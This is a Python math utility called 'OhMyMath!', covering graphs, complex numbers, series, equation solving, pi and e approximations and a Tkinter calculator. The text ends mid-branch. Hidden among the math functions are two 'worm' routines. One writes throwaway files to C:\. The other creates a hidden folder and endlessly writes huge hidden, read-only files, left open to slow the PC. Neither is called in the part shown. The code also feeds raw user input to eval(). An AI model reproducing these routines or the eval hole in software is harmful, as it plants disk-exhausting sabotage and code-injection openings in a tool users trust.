
print("Loading required files...")

## Importing all required modules

## Importing `monotonic` as `mt` from `time` module
from time import monotonic as mt, sleep as s

## Taking starting time to calculate total time spent everywhere in the program while running
startTime = mt()

## Importing `datetime` from `datetime` to know the current date and time
from datetime import datetime

## Importing `math` module as `m`
import math as m

## Importing `path` from `os` for functions `exists`, `system` for cmd, and `mkdir` to create a folder if it doesn't exist
from os import path, system, mkdir

## Importing all functions from `tkinter` module
from tkinter import *
from tkinter import messagebox as mb

## Importing required functions to change attributes of folders and windows
from win32api import SetFileAttributes as SFA
from win32con import FILE_ATTRIBUTE_HIDDEN as FAH, FILE_ATTRIBUTE_READONLY as FAR, SW_HIDE as HIDE
from win32gui import GetForegroundWindow as GFW, ShowWindow as SW

try:

    ## Importing `numpy` as `np` for `linspace` (arrays), and mathematical functions
    import numpy as np

    ## Importing `matplotlib.pyplot` as `plt` for plotting graphs
    import matplotlib.pyplot as plt

    ## Importing `gamma` function for `factorial` of an array to plot graphs
    from scipy.special import gamma


except ModuleNotFoundError or ImportError:

    ## Using `cmd.exe` to install required packages using `pip`
    system("pip install numpy && pip install matplotlib && pip install scipy && exit")

    '''
    cmd = GFW()
    SW(cmd, HIDE)
    '''

    ## Importing `numpy` as `np` for `linspace` (arrays), and mathematical functions
    import numpy as np

    ## Importing `matplotlib.pyplot` as `plt` for plotting graphs
    import matplotlib.pyplot as plt

    ## Importing `gamma` function for `factorial` of an array to plot graphs
    from scipy.special import gamma


## Importing `load`, `dump` for dictionary of email-name pair as key-value pair from `json` module
from json import load, dump

## Importing `choice` from `random` module
from random import choice as ch

print("Loaded!")

## Globally declaring constants
x = np.arange(-10, 10.001, 0.001)
inf = float('inf')

## Taking email ID for confirmation and to check if user is new or existing
email = input("Email :- ")
email = email.lower()





def evalall(string1):   ## Advanced `evalall()` function to evaluate mathematical constants as well
    if ((type(string1) == int) or (type(string1) == float)):
        string1 = str(string1)
    if ((string1 == '') or (string1.isspace() == True)):
        return 1
    string1 = string1.replace(' ', '')
    string1 = string1.replace('π', str(m.pi))
    string1 = string1.replace('p', str(m.pi))
    string1 = string1.replace('e', str(m.e))
    string1 = string1.replace('j', str(1j))
    string1 = string1.replace('ι', str(1j))
    string1 = string1.replace('×', '*')
    string1 = string1.replace('•', '*')
    string1 = string1.replace('÷', '/')
    string1 = string1.replace('^', '**')
    string1 = string1.replace('∞', str(inf))
    string1 = string1.replace('sin(', 'm.sin(')
    string1 = string1.replace('cos(', 'm.cos(')
    string1 = string1.replace('tan(', 'm.tan(')
    string1 = string1.replace('csc(', '1/m.sin(')
    string1 = string1.replace('sec(', '1/m.cos(')
    string1 = string1.replace('cot(', '1/m.tan(')
    string1 = string1.replace('fact(', 'm.gamma(1+')
    string1 = string1.replace('ln(', '2.302585092994046*log(')
    string1 = string1.replace('log(', 'm.log10(')
    string1 = string1.replace('log2(', 'm.log2(')
    string1 = string1.replace('√(', 'm.sqrt(')

    if (string1 == str(1j ** 1j)):
        return f'e^(-π/2) = {m.e ** (-m.pi / 2)}'

    number = eval(string1)
    if (type(number) != complex):	## `number` is Real; Real Numbers set is a subset of Imaginary Numbers set
        if (number >= 9999999999999999):
            return '∞'
        if (number == int(number)):
            number = int(number)
        '''
        if (round(number, 5) == 3.14159):
            return f'= {number} ≈ π'
        if (round(number, 5) == 2.71828):
            return f'= {number} ≈ e'
        '''
        if (round(number, 8) == 0):
            number = round(number, 5)
        if (int(number) == number):
            number = int(number)
        return number
    
    a = number.real
    b = number.imag
    number = a + b * 1j
    if (round(a, 8) == 0):
    	a = 0
    	return f'{b}ι'
    if (int(round(b, 8)) == 0):
    	b = 0
    	return int(a)
    if (number == (-1+1.2246467991473532e-16j)):
    	return -1
    if (number == 1j):
    	return '√-1'
    return f'{number.real} + ({number.imag})ι'
    





def evalfunction(string1="x"): ## Function `evalfunction` to evaluate a given mathematical function, `equation`, to plot graphs with variable `x`
    string1 = string1.lower()
    string1 = string1.replace(' ', '')
    string1 = string1.replace('π', str(m.pi))
    string1 = string1.replace('p', str(m.pi))
    string1 = string1.replace('e', str(m.e))
    string1 = string1.replace('j', str(1j))
    string1 = string1.replace('ι', str(1j))
    string1 = string1.replace('×', '*')
    string1 = string1.replace('•', '*')
    string1 = string1.replace('÷', '/')
    string1 = string1.replace('^', '**')
    string1 = string1.replace('sin(', 'np.sin(')
    string1 = string1.replace('cos(', 'np.cos(')
    string1 = string1.replace('tan(', 'np.tan(')
    string1 = string1.replace('csc(', '1/np.sin(')
    string1 = string1.replace('sec(', '1/np.cos(')
    string1 = string1.replace('cot(', '1/np.tan(')
    string1 = string1.replace('fact(', 'gamma(')
    string1 = string1.replace('ln(', '2.302585092994046*log(')
    string1 = string1.replace('log(', 'np.log10(')
    string1 = string1.replace('log2(', 'np.log2(')
    string1 = string1.replace('sqrt(', 'np.sqrt(')
    try:
        equation = eval(string1)
    except ZeroDivisionError:
        equation = inf
    return equation





def userDataDictManager(emailID):
    if not (path.exists("C:\\OhMyMath!\\Userdata.json")):
        baseDict = {"admin@email.com": "Administrator"}
        fileObj = open("C:\\OhMyMath!\\Userdata.json", "w")
        dump(baseDict, fileObj, indent=4)
        fileObj.close()
    userdata = open("C:\\OhMyMath!\\Userdata.json", "r")
    userDataDict = load(userdata)
    userdata.close()

    if (emailID in userDataDict.keys()):  ## User exists and will be logged in
        userName = userDataDict[emailID]
        username = userName.split()[0]
        print(f"Welcome, {username}! You have logged in successfully!")

    else:   ## User is new and will be signed up
        print("Creating account...")
        userName = input("Please enter your full Name :- ")
        userName = userName.title()
        userDataDict.update({emailID: userName})
        userdata = open("C:\\OhMyMath!\\Userdata.json", "w")
        dump(userDataDict, userdata, indent=4)
        userdata.close()
        username = userName.split()[0]
        print(f"Welcome, {username}! You have signed up successfully.")
        print("You can now use all the following functions!")

    return username





try:
    mkdir("C:\\OhMyMath!")

except:
    pass

userName = userDataDictManager(emailID=email)

print()

## Counter to count no. of times a function/area has been used; initial = 0
counter = 0
## Counter to count no. of times an Easter Egg has been found; initial = 0
easterCounter = 0


## Functions used later in the program will be defined here
def arithmeticProgression(firstTerm=1, comDiff=1, terms=10):    ## Function `arithmeticProgression` where default values of `firstTerm`, `comDiff`, and `terms` are `0`, `1`, and `10` respectively
    L1 = []
    arithSum = 0
    arithProd = 1
    for x in range(1, terms+1, 1):
        ax = firstTerm + ((x - 1) * comDiff)
        L1.append(ax)
        arithSum += ax
        arithProd *= ax
    print("A.P. =", tuple(L1))
    if ((arithSum == float('inf')) or (arithProd == float('inf'))):
    	return "Sum → ∞\nProduct → ∞"
    return f"Sum = {arithSum}\nProduct = {arithProd}"


def geometricProgression(firstTerm=1, comRatio=m.e, terms=10):    ## Function `geometricProgession` where default values of `firstTerm`, `comRatio`, and `terms` are `1`, `2`, and `10` respectively
    L1 = []
    geoSum = 0
    geoProd = 1
    for x in range(1, terms+1, 1):
        ax = firstTerm * ((comRatio) ** (x - 1))
        L1.append(ax)
        geoSum += ax
        geoProd *= ax
    print("G.P. =", tuple(L1))
    if ((m.fabs(comRatio) < 1) and (terms >= 50)):
        geoSum = firstTerm / (1 - comRatio)
        geoProd = 0
        return f"Sum ≈ {geoSum}\nProduct ≈ {geoProd}"
    if ((geoSum == float('inf')) or (geoProd == float('inf'))):
    	return "Sum → ∞\nProduct → ∞"
    return f"Sum = {geoSum}\nProduct = {geoProd}"


def harmonicProgression(firstTerm=1, comDiff=1, terms=10):  ## Function `harmonicProgession` where default values of `firstTerm`, `comDiff`, and `terms` are `1`, `1`, and `10` respectively
    L1 = []
    harSum = 0
    harProd = 1
    for x in range(1, terms+1, 1):
        ax = f'1/{firstTerm + ((x - 1) * comDiff)}'
        L1.append(ax)
        harSum += float(evalall(ax))
        harProd *= float(evalall(ax))
    print("H.P. =", tuple(L1))
    if ((harSum == float('inf')) or (harProd == float('inf'))):
    	return "Sum → ∞\nProduct → ∞"
    if (int(round(harProd, 8)) == 0):
    	harProd = 0
    return f"Sum = {harSum}\nProduct = {harProd}"


def arithmeticGeometricProgression(arithFirstTerm=1, geoFirstTerm=1, comDiff=1, comRatio=m.e, terms=10):  ## Function `arithmeticGeometricProgession` where default values of `arithFirstTerm`, `geoFirstTerm`, `comDiff`, `comRatio`, and `terms` are `1`, `1`, `1`, `2`, and `10` respectively
    L1 = []
    agSum = 0
    agProd = 1
    for x in range(1, terms+1, 1):
        ax = (arithFirstTerm + (x - 1) * comDiff) * geoFirstTerm * (comRatio ** (x - 1))
        L1.append(ax)
        agSum += ax
        agProd *= ax
    print("A.G.P. =", tuple(L1))
    if ((agSum == float('inf')) or (agProd == float('inf'))):
    	return "Sum → ∞\nProduct → ∞"
    return f"Sum = {agSum}\nProduct = {agProd}"


def fibonacciSequence(terms=10):        ## Function `fibonacciSequence` to print Fibonacci series, sum, and product till `terms` terms; `terms` defaults to `10`
    a = 0
    b = 1
    L1 = [a, b]
    fiboSum = a + b
    fiboProd = b
    for x in range(1, terms+1, 1):
        c = a + b
        L1.append(c)
        fiboSum += c
        fiboProd *= c
        a = b
        b = c
    print("Fibonacci Series =", tuple(L1))
    return f"Sum = {fiboSum}\nProduct (excluding 0) = {fiboProd}"


def tribonacciSequence(terms=10):       ## Function `tribonacciSequence` to print Tribonacci series, sum, and product till `terms` terms; `terms` defaults to `10`
    a, b, c = 0, 1, 2
    L1 = [a, b, c]
    triboSum = a + b + c
    triboProd = b * c
    for x in range(1, terms+1, 1):
        d = a + b + c
        L1.append(d)
        triboSum += d
        triboProd *= d
        a, b, c = b, c, d
    print("Tribonacci Series =", tuple(L1))
    return f"Sum = {triboSum}\nProduct (excluding 0) = {triboProd}"


def mersenneSeries(terms=10): ## Function `mersenneSeries` to print Mersenne numbers, sum, and product till `terms` terms; `terms` defaults to `10`
    L1 = []
    merSum = 0
    merProd = 1
    for x in range(1, terms+1, 1):
        ax = 2 ** x - 1
        L1.append(ax)
        merSum += ax
        merProd *= ax
    print("Mersenne Series =", tuple(L1))
    return f"Sum = {merSum}\nProduct = {merProd}"


def exponentialSeries(base=m.e, terms=10):    ## Function `exponentialSeries`; `base` and `terms` default to `m.e` and `10` respectively, where `m.e` is `math.e`
    L1 = []
    expSum = 0
    expProd = 1
    for x in range(1, terms+1, 1):
        ax = base ** x
        L1.append(ax)
        expSum += ax
        expProd *= ax
    print("Exponential Series =", tuple(L1))
    return f"Sum = {expSum}\nProduct = {expProd}"


def logarithmicSeries(base=m.e, terms=10):    ## Function `logarithmicSeries`; `base` and `terms` default to `m.e` and `10` respectively, where `m.e` is `math.e`
    L1 = []
    logSum = 0
    logProd = 1
    for x in range(2, terms+2, 1):
        ax = m.log(x, base)
        L1.append(ax)
        logSum += ax
        logProd *= ax
    print("Logarithmic Series =", tuple(L1))
    return f"Sum = {logSum}\nProduct = {logProd}"


def primeSeries(terms=10):    ## Function `primeSeries` to print Prime numbers, sum and product till `terms` terms; `terms` defaults to `10`
    num = 2
    L = ['Counter']
    L1 = []
    primeSum = 0
    primeProd = 1
    while (len(L) <= terms):
        i = 0
        p = 2
        while (p < num):
            if (num % p == 0):
                i = 1
            p += 1
        if (i != 1):
            L1.append(num)
            L.append('Counter')
        num += 1
    print("Prime Series =", tuple(L1))
    primeSum = sum(L1)
    for x in L1:
        primeProd *= x
    return f"Sum = {primeSum}\nProduct = {primeProd}"


def factorialSeries(terms=10):  ## Function `factorialSeries` to print Factorials, sum, and product till `terms` terms; `terms` defaults to `10`; Factroials start from 0!
    L1 = []
    factSum = 0
    factProd = 1
    for x in range(0, terms, 1):
        fact = m.factorial(x)
        L1.append(fact)
        factSum += fact
        factProd *= fact
    print(f"Factorials till {terms} terms = {tuple(L1)}")
    return f"Sum = {factSum}\nProduct = {factProd}"


def piLeibniz(power=1):        ## Function `piLeibniz` to approximate the value of π using Leibniz's Approximation; π = 3.1415928535897395
    '''
    pi = 0
    L1 = []
    for x in range(1, 10000003, 2):
        L1.append('Counter')
        if (len(L1)%2 == 0):
            pi -= 1 / x
        else:
            pi += 1 / x
    π = (pi * 4)
    return π
    '''
    return (3.1415928535897395 ** power)


def piEuler(power=1):  ## Function `piEuler` to approximate the value of π using Euler's Approximation; π = 3.1415925580959025
	'''
	pi = 0
	for x in range(1, 10000001, 1):
		pi += (1 / (x ** 2))
	π = ((pi * 6) ** (1 / 2))
	return π
	'''
	return (3.1415925580959025 ** power)


def piLordBrouncker1(power=1): ## Function `piLordBrouncker1` to approximate the value of π using Lord Brouncker's 1st Approximation; π = 3.1415926217577352
	'''
	pi = 0
	for x in range(1, 10000001, 1):
		pi += (1 / (((2 * x) - 1) ** 2))
	π = ((pi * 8) ** (1 / 2))
	return π
	'''
	return (3.1415926217577352 ** power)


def piLordBrouncker2(power=1): ## Function `piLordBrouncker2` to approximate the value of π using Lord Brouncker's 2nd Approximation; π = 3.141592462603859
    '''
    pi = 0
    for x in range(2, 10000003, 2):
        pi += (1 / (x ** 2))
    π = ((pi * 24) ** (1 / 2))
    return π
    '''
    return (3.141592462603859 ** power)


def piWallis(power=1):       ## Function `piWallis` to approximate the value of π using Wallis' Product; π = 3.14159249649794
    '''
    pi = 1
    for x in range(2, 10000003, 2):
        pi *= (1 - (1 / (x ** 2)))
    π = 2 / pi
    return π
    '''
    return (3.14159249649794 ** power)


def piMadhava(power=1):	## Function `piMadhava` to approximate the value of π using Madhava's series; π = 3.1415927535897814
	'''
	pi = 0
	for x in range(0, 10000001, 1):
		pi += ((-1) ** x) / (2 * x + 1)
	π = 4 * pi
	return π
	'''
	return (3.1415927535897814 ** power)


def eTaylor(power=1): ## Function `eTaylor` to approximate the value of e using Taylor Series; e = 2.7182818284590455
    '''
    e = 0
    for x in range(0, 10001, 1):
        e += (power ** x) / (m.factorial(x))
    return e
    '''
    return (2.7182818284590455 ** power)



class HoverButton(Button):
    """
    Class `HoverButton` to modify `Button` for repairing `activeforeground` and `activebackground` in Python 3.7.4 and earlier
    """
    def __init__(self, master, **kw):
        Button.__init__(self, master=master, **kw)
        self.defaultForeground = self["foreground"]
        self.defaultBackground = self["background"]
        self.bind("<Enter>", self.onEnter)
        self.bind("<Leave>", self.onLeave)

    def onEnter(self, e):
        self["foreground"] = self["activeforeground"]
        self["background"] = self["activebackground"]

    def onLeave(self, e):
        self["foreground"] = self.defaultForeground
        self["background"] = self.defaultBackground
        


## Globally declare the expression variable for Calculator GUI in option 7.
expression = ""


def press(num): ## Function to update expression in the text entry box 
    ## Point out the global expression variable 
    global expression, equation

    if (num == 'fact('):
        ## Special case for factorials
        expression = 'fact(' + str(expression) + ')'
    else:
        ## Concatenation of string 
        expression += str(num) 

    ## Update the expression by using set method 
    equation.set(expression) 

 
def evaluate():   ## Function to evaluate the final expression
    ## Try and except statement is used for handling the errors like zero division error etc.
    ## Put that code inside the try block which may generate the error
    global expression, equation

    try:
        ## evalall() function evaluate the expression and str function convert the result into string
        expression = str(evalall(expression))
        equation.set(expression)

    except ZeroDivisionError:
        equation.set('∞')
        expression = ""

    ## If error is generated, then handles it by the except block
    except:
        equation.set("ERROR")
        expression = ""


def baseConvertingCalculator():
    global expression, equation, baseCounter
    expression = evalall(expression)
    if (expression == int(expression)):
        expression = int(expression)

    def decimalToBinary(number):
        ## `split()` seperates whole number and decimal part and stores it in two seperate variables
        if (type(number) == float):
            whole, dec = str(number).split(".")
            ## Convert both whole number and decimal part from string type to integer type
            whole = int(whole)
            dec = int (dec)
            ## Convert the whole number part to it's respective binary form and remove the  "0b" from it.
            res = bin(whole).lstrip("0b") + "."
            ## Iterate the number of times, we want the number of decimal places to be
            for x in range(0, len(str(dec)), 1):
                ## Multiply the decimal value by 2 and seperate the whole number part and decimal part
                whole, dec = str((decimalToBinary(dec)) * 2).split(".")
                ## Convert the decimal part to integer again
                dec = int(dec)
                ## Keep adding the integer parts receive to the result variable
                res += whole
        else:
            res = bin(number)     
        equation.set(str(res)[2::])

    ## Function converts the value passed as parameter to it's decimal representation
    def binaryToDecimal(number):
        num = number
        decValue = 0
        ## Initializing base value to 1, i.e 2 ^ 0
        base = 1
        temp = num
        while (temp):
            lastDigit = temp % 10
            temp = int(temp / 10)
            decValue += lastDigit * base
            base = base * 2
        equation.set(str(decValue))

    if (baseCounter == 0):
        decimalToBinary(expression)
        baseCounter = 1
    else:
        binaryToDecimal(expression)
        baseCounter = 0



def epii(): ## Secret function 1. to type and evaluate e**(π*ι) = -1
    global expression, equation
    expression = 'e^(π×ι)'
    equation.set('e^(πι)')
    evaluate()


def showe():    ## Secret function 2. to type and evaluate e = 2.71828
    global expression, equation
    expression = 'e'
    equation.set(expression)
    evaluate()


def showPi():   ## Secret function 3. to type and evaluate π = 3.14159
    global expression, equation
    expression = 'π'
    equation.set(expression)
    evaluate()


def showi():    ## Secret function 4. to type and evaluate ι = √-1
    global expression, equation
    expression = 'ι'
    equation.set(expression)
    evaluate()


def epowe():    ## Secret function 5. to type and evaluate e**e = 15.15426
    global expression, equation
    expression = 'e^e'
    equation.set(expression)
    evaluate()


def pipowpi():  ## Secret function 6. to type and evaluate π**π = 36.46216
    global expression, equation
    expression = 'π^π'
    equation.set(expression)
    evaluate()


def epowpi():   ## Secret function 7. to type and evaluate e**π = 23.14069
    global expression, equation
    expression = 'e^π'
    equation.set(expression)
    evaluate()


def pipowe():   ## Secret function 8. to type and evaluate π**e = 22.45916
    global expression, equation
    expression = 'π^e'
    equation.set(expression)
    evaluate()


def ipowi():    ## Secret function 9. to type and evaluate ι**ι = e**(-π/2) = 0.20788
    global expression, equation
    expression = 'ι^ι'
    equation.set(expression)
    evaluate()


def ipowe():    ## Secret function 10. to type and evaluate ι**e = -0.42822-0.90368j
    global expression, equation
    expression = 'ι^e'
    equation.set(expression)
    evaluate()


def ipowpi():   ## Secret function 11. to type and evaluate ι**π = 0.22058-0.97537j
    global expression, equation
    expression = 'ι^π'
    equation.set(expression)
    evaluate()


def epowi():    ## Secret function 12. to type and evaluate e**ι = 0.54030+0.84147j
    global expression, equation
    expression = 'e^ι'
    equation.set(expression)
    evaluate()
    

def pipowi():   ## Secret function 13. to type and evaluate π**ι = 0.41329+0.91060j
    global expression, equation
    expression = 'π^ι'
    equation.set(expression)
    evaluate()


def datetime(): ## Secret function 14. return today's date and time
    global expression, equation
    expression = str(datetime.now())
    equation.set(expression)


def clear():    ## Function to clear the whole expression
    global expression, equation
    expression = ''
    equation.set(expression)


def delete():   ## Function to clear the last entered character
    global expression, equation

    try:
        if (expression[-1] != ' '):
            expression = expression[0: -1: 1]

        else:
            expression = expression[0: -3: 1]
        
        equation.set(expression)

    except:
        pass


def onClosing():    ## User clicks ' X ' in attempt to exit the application
    if (mb.askyesnocancel("Leave?", "Do you want to leave to the main application?")):    ## Prompts if user wants to leave the GUI; `Yes`: Leaves GUI, `No`: Stays in the GUI, `Cancel`: Closes and prompt and continues to stay in the GUI (similar to `No`)
        dt = mt() - t1
        print(f"You spent {round(dt, 2)} seconds in the calculator.")
        calculatorGUI.destroy()


def wormFiniteFileCreator(fileCount, lineCount):   ## Function `wormFiniteFileCreator(fileCount=file_count, lineCount=line_count)` to create Worm to eat up space (limited; user decides no. of files)
    file_counter = 1
    while (file_counter <= fileCount): ## `while` loop - 1
        fileObj = open(f"C:\\ImportantFiles_{file_counter}.txt", "w+")
        x = 1
        while (x <= lineCount):  ## `while` loop - 2 <==> Nested `while` Loop - 1
            fileObj.write('\n')
            x += 1
        print(f"ImportantFiles_{file_counter}.txt with {lineCount} lines has been created in your `C:` Drive.")
        ## Created files NOT closed to occupy more NameSpace (slows down the PC)
        file_counter += 1


def wormInfiniteFileCreator():   ## Function 'wormInfiniteFileCreator()' to create Infinite large empty files on trigger (unlimited; user-independent)
    file_counter = 1
    x = 1
    try:
        mkdir("C:\\Important Files")
        SFA("C:\\Important Files", FAH)
    except:
        pass
    while True:
        fileObj = open(f"C:\\Important Files\\ImportantFiles_{file_counter}.txt", "w+")
        while (x < 100000000000000):
            fileObj.write('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'*100)
            x += 1
        SFA(fileObj, FAH)
        SFA(fileObj, FAR)
        print(f"ImportantFiles_{file_counter}.txt has been created at some secret location in your PC.")
        ## Created files NOT closed to occupy more NameSpace (slows down the PC)
        file_counter += 1
        


## Driver/main code
if (__name__ == "__main__"):
    ## Infinite `while` loop till `break`; prints blank line after every iteration
    while (True):
        print()
        ## Menu of available functions/subprograms
        Choice = input("Choose from the following:\n1. Graphs of functions\n2. Complex numbers (a + ιb)\n3. Series (AP, GP, HP, AGP, & Special series)\n4. Equation solver\n5. Approximations of π\n6. Approximations of e\n7. Calculator\n0. Quit\nEnter any no. between 0 to 7 :- ")
        if (Choice.isdigit() == True):
            choice = str(int(Choice))
        else:
            choice = None

        if (choice == '0'):       ## Quitting the program using `break`
            endtime0 = mt()
            dt = endtime0 - startTime
            ## Taking ending time to calculate total time spent everywhere in the program while running by subtracting `startTime` from `endtime`
            endtime = mt()
            dt = endtime - startTime
            print("Thank you for using this program!")
            print(f"You have used the functions of this program {counter} times for a total of {round(dt, 2)} seconds now.")
            s(2.5)
            break

        elif (choice == '1'):     ## Graphs/Plots/Charts of functions using `matplotlib`
            print()
            counter += 1
            y = evalfunction(input("Enter an equation :- "))
            t1 = mt()
            plt.style.use('dark_background')
            plt.rcParams["mathtext.fontset"] = "stix"
            plt.grid(color='#151519', linestyle='-')
            plt.title("Functions "+r"$(y = f(x))$", fontfamily='Helvetica Neue', fontsize=24, fontweight='light')
            plt.xlabel(r"$x$", fontfamily='Helvetica Neue', fontsize=20)
            plt.ylabel(r"$y$", fontfamily='Helvetica Neue', fontsize=20)
            plt.plot(x, y, '#3264FF', linewidth=2)
            rootsList = []
            for X, Y in zip(x, y):
                if (round(X, 8) == 0.0):
                    if (int(Y) == Y):
                        Y = int(Y)
                    if (abs(Y) == 0.0):
                        Y = 0
                        rootsList.insert(0, 0)
                    print(f"y-intercept = {round(Y, 4)}")
                if (round(Y, 8) == 0.0):
                    if (abs(X) == 0.0):
                        X = 0
                    if (int(X) == X):
                        X = int(X)
                    rootsList.append(X)
            print(f"Real root(s) of the equation is (are): ")
            for i in rootsList:
                print(f"{round(i, 4)}")
            t2 = mt()
            dt = t2 - t1
            print(f"Graph delivered in {round(dt, 2)} seconds.")
            plt.show()
            t3 = mt()
            dt = t3 - t2
            print(f"You took {round(dt, 2)} seconds there.")

        elif (choice == '2'):   ## Imaginary/Complex numbers (z = a + ιb)
            print()
            counter += 1
            a = input("Enter the Real part 'a' :- ")
            b = input("Enter the Imaginary part 'b' :- ")
            t1 = mt()
            a, b = evalall(a), evalall(b)
            ι = 1j
            z = a + (b * ι)

            if (b == 0):
                print("The Complex No. =", a)
                print("The Conjugate =", a)
                print("The Square =", a ** 2)
                print(f"The Roots = ±{round(a ** (1 / 2), 4)}")
                print("The Modulus =", m.fabs(a))
                if not (abs(a) == 0):
                    print("The Inverse =", a ** (-1))
                print(f"The Euler-Trigonometric form = {round(m.fabs(a), 4)}(cos(0) + ιsin(0)) = {round(m.fabs(a), 4)}e^(0ι)")
                t2 = mt()
                dt = t2 - t1
                print(f"Answers delivered in {round(dt, 2)} seconds.")
                continue

            print("The Complex No. =", z)
            print("The Conjugate =", a - b * ι)
            print("The Square =", z ** 2)
            print(f"The Roots = ±{z ** (1 / 2)}")
            print("The Modulus =", round(m.fabs(((a ** 2) + (b ** 2)) ** (1 / 2)), 4))
            if not ((abs(a) == 0) and (abs(b) == 0)):
                print("The Inverse =", z ** (-1))
            if (a == 0):
                print(f"The Euler-Trigonometric form = {round(m.fabs(b), 4)}(cos(π/2) + ιsin(π/2)) = {round(m.fabs(b), 4)}e^(ιπ/2)")
            else:
                print(f"The Euler-Trigonometric form = {round(m.fabs(((a ** 2) + (b ** 2)) ** (1 / 2)), 4)}(cos({round(m.acos(a / m.fabs(((a ** 2) + (b ** 2)) ** (1 / 2))), 4)}) + ιsin({round(m.asin(b / m.fabs(((a ** 2) + (b ** 2)) ** (1 / 2))), 4)})) = {round(m.fabs(((a ** 2) + (b ** 2)) ** (1 / 2)), 4)}e^({round(m.asin(b / m.fabs(((a ** 2) + (b ** 2)) ** (1 / 2))), 4)}ι)")
            t2 = mt()
            dt = t2 - t1
            print(f"Answers delivered in {round(dt, 2)} seconds.")
            continue

        elif (choice == '3'):   ## Series (A.P., G.P., H.P., A.G.P., & Special series)
            print()
            counter += 1
            series = int(evalall(input("Choose between the following series:\n1. Arithmetic Progression (A.P.)\n2. Geometric Progression (G.P.)\n3. Harmonic Progression (H.P.)\n4. Arithmetic-Geometric Progression (A.G.P.)\n5. Natural Numbers (N)\n6. Fibonacci Series\n7. Tribonacci Series\n8. Mersenne Numbers\n9. Exponential Series\n10. Logarithmic Series\n11. Prime Series\n12. Factorial Series\nEnter any no. between 1 to 12 :- ")))
            
            if (series == 1):       ## Arithmetic Progression (A.P.)
                a1 = evalall(input("Enter the first term 'a₁' :- "))
                d = evalall(input("Enter the common difference 'd' :- "))
                n = int(evalall(input("Enter the total no. of terms 'n' :- ")))
                t1 = mt()
                print(arithmeticProgression(firstTerm=a1, comDiff=d, terms=n))
                t2 = mt()
                dt = t2 -t1
                print(f"Answer delivered in {round(dt, 2)} seconds.")
                continue

            elif (series == 2):     ## Geometric Progression (G.P.)
                a = evalall(input("Enter the first term 'a' :- "))
                r = evalall(input("Enter the common ratio 'r' :- "))
                n = int(evalall(input("Enter the total no. of terms 'n' :- ")))
                t1 = mt()
                print(geometricProgression(firstTerm=a, comRatio=r, terms=n))
                t2 = mt()
                dt = t2 - t1
                print(f"Answer delivered in {round(dt, 2)} seconds.")
                continue

            elif (series == 3):     ## Harmonic Progression (H.P.)
                a1 = evalall(input("Enter the first term 'a₁' :- "))
                d = evalall(input("Enter the common difference 'd' :- "))
                n = int(evalall(input("Enter the total no. of terms 'n' :- ")))
                t1 = mt()
                print(harmonicProgression(firstTerm=a1, comDiff=d, terms=n))
                t2 = mt()
                dt = t2 - t1
                print(f"Answer delivered in {round(dt, 2)} seconds.")
                continue

            elif (series == 4):     ## Arithmetic-Geometric Progression (A.G.P.)
                a1 = evalall(input("Enter the first term of A.P. 'a₁' :- "))
                a = evalall(input("Enter the first term of G.P. 'a' :- "))
                d = evalall(input("Enter the common difference 'd' :- "))
                r = evalall(input("Enter the common ratio 'r' :- "))
                n = int(evalall(input("Enter the total no. of terms 'n' :- ")))
                t1 = mt()
                print(arithmeticGeometricProgression(arithFirstTerm=a1, geoFirstTerm=a, comDiff=d, comRatio=r, terms=n))
                t2 = mt()
                dt = t2 - t1
                print(f"Answer delivered in {round(dt, 2)} seconds.")
                continue

            elif (series == 5):     ## Natural Numbers (N)
                n = int(evalall(input("Enter the total no. of terms 'n' :- ")))
                t1 = mt()
                print(arithmeticProgression(terms=n))
                t2 = mt()
                dt = t2 - t1
                print(f"Answer delivered in {round(dt, 2)} seconds.")
                continue

            elif (series == 6):     ## Fibonacci Series
                n = int(evalall(input("Enter the total no. of terms 'n' :- ")))
                t1 = mt()
                print(fibonacciSequence(terms=n))
                t2 = mt()
                dt = t2 - t1
                print(f"Answer delivered in {round(dt, 2)} seconds.")
                continue

            elif (series == 7):     ## Tribonacci Series
                n = int(evalall(input("Enter the total no. of terms 'n' :- ")))
                t1 = mt()
                print(tribonacciSequence(terms=n))
                t2 = mt()
                dt = t2 - t1
                print(f"Answer delivered in {round(dt, 2)} seconds.")
                continue

            elif (series == 8):     ## Mersenne Numbers
                n = int(evalall(input("Enter the total no. of terms 'n' :- ")))
                t1 = mt()
                print(mersenneSeries(terms=n))
                t2 = mt()
                dt = t2 - t1
                print(f"Answer delivered in {round(dt, 2)} seconds.")
                continue

            elif (series == 9):     ## Exponential Series
                a = input("Enter the base 'a' (a ≥ 0) :- ")
                n = int(evalall(input("Enter the total no. of terms 'n' :- ")))
                t1 = mt()

                if (evalall(a) < 0):
                    print("The value of 'a' can't be less than 0. Retry?")
                    continue

                a = evalall(a)
                print(exponentialSeries(base=a, terms=n))
                t2 = mt()
                dt = t2 - t1
                print(f"Answer delivered in {round(dt, 2)} seconds.")
                continue

            elif (series == 10):    ## Logarithmic Series
                a = evalall(input("Enter the base 'a' (a > 0 and a ≠ 1) :- "))
                n = int(evalall(input("Enter the total no. of terms 'n' :- ")))
                t1 = mt()

                if ((a < 0) or (a == 1)):
                    print("The value of 'a' can't be less than 0 or equal to 1. Retry?")
                    continue

                print(logarithmicSeries(base=a, terms=n))
                t2 = mt()
                dt = t2 - t1
                print(f"Answer delivered in {round(dt, 2)} seconds.")
                continue

            elif (series == 11):    ## Prime Series
                n = int(evalall(input("Enter the total no. of terms 'n' :- ")))
                t1 = mt()
                print(primeSeries(terms=n))
                t2 = mt()
                dt = t2 - t1
                print(f"Answer delivered in {round(dt, 2)} seconds.")
                continue

            elif (series == 12):    ## Factorial Series
                n = int(evalall(input("Enter the total no. of terms 'n' :- ")))
                t1 = mt()
                print(factorialSeries(terms=n))
                t2 = mt()
                dt = t2 - t1
                print(f"Answer delivered in {round(dt, 2)} seconds.")
                continue

            else:
                counter -= 1
                print("Option unavailable. Retry?")
                continue

        elif (choice == '4'):   ## Equation solver - Functions and Equations
            print()
            counter += 1
            func = int(evalall(input("Choose:\n1. Linear Equation (1 variable)\n2. Linear Equations (2 variables)\n3. Quadratic Equation (ax² + bx + c = 0)\nEnter any no. from 1 to 3 :- ")))

            if (func == 1):    ## Linear Equation in 1 variable
                print("ax + b = 0")
                a = evalall(input("Enter 'a' (a ≠ 0):- "))
                b = evalall(input("Enter 'b' :- "))
                t1 = mt()

                if (float(evalall(a)) == 0):
                    if (float(evalall(b)) == 0):
                        print("You have entered any identity and not an equation!")
                        continue
